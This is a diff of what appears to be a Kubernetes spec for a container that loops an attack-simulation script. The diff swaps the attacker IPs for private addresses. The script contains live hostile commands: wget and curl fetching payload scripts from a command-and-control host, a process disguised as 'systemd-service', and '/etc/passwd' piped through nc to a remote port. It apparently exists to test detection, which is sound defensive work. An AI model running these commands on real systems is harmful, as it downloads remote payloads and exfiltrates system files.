@@ -43,7 +43,7 @@ spec:
                 
                 echo "[$(date)] Downloading deceptive file 'update_pkg.sh'..."
                 wget -O /tmp/update_pkg.sh http://malicious-c2.internal/update.sh 2>/dev/null || echo "Download failed (simulated)"
-                curl -s http://185.220.101.1/payload.sh -o /tmp/payload.sh || true
+                curl -s http://10.255.255.1/payload.sh -o /tmp/payload.sh || true
                 
                 echo "[$(date)] Executing disguised program..."
                 cp /bin/ls /tmp/systemd-service
@@ -58,7 +58,7 @@ spec:
                 nc -zv -w 1 10.0.0.1 80 2>&1 || true
                 
                 echo "[$(date)] Data exfiltration simulation..."
-                cat /etc/passwd | nc -w 1 185.220.101.1 4444 2>&1 || true
+                cat /etc/passwd | nc -w 1 10.255.255.2 4444 2>&1 || true
                 
                 sleep 30
               done
